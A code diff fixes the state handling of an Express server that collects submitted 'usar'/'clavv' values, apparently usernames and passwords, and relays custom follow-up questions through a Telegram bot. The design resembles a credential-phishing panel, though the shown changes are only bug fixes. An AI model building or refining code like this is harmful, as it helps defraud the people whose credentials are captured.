@@ -52,7 +52,7 @@ app.post('/enviar', async (req, res) => {
     usar,
     clavv,
     preguntas: [],
-    esperando_pregunta: 1
+    esperando_pregunta: 0
   };
   guardarEstado();
 
@@ -91,6 +91,7 @@ app.post('/webhook', async (req, res) => {
 
     if (accion === 'preguntas_menu') {
       cliente.esperando_pregunta = 1;
+      cliente.preguntas = [];
       guardarEstado();
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -125,14 +126,14 @@ app.post('/webhook', async (req, res) => {
     const chatId = message.chat.id;
     const text = message.text?.trim();
 
-    const txid = Object.keys(clientes).find(id => clientes[id].esperando_pregunta);
+    const txid = Object.keys(clientes).find(id => clientes[id].esperando_pregunta > 0);
     if (!txid) return res.sendStatus(200);
 
     const cliente = clientes[txid];
     if (!cliente || !text) return res.sendStatus(200);
 
-    cliente.preguntas.push(text);
-    if (cliente.preguntas.length === 1) {
+    if (cliente.esperando_pregunta === 1) {
+      cliente.preguntas[0] = text;
       cliente.esperando_pregunta = 2;
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -145,7 +146,8 @@ app.post('/webhook', async (req, res) => {
 ✍️ Ahora escribe la segunda pregunta personalizada para ${txid}.`
         })
       });
-    } else {
+    } else if (cliente.esperando_pregunta === 2) {
+      cliente.preguntas[1] = text;
       cliente.esperando_pregunta = 0;
       cliente.status = 'preguntas';
 
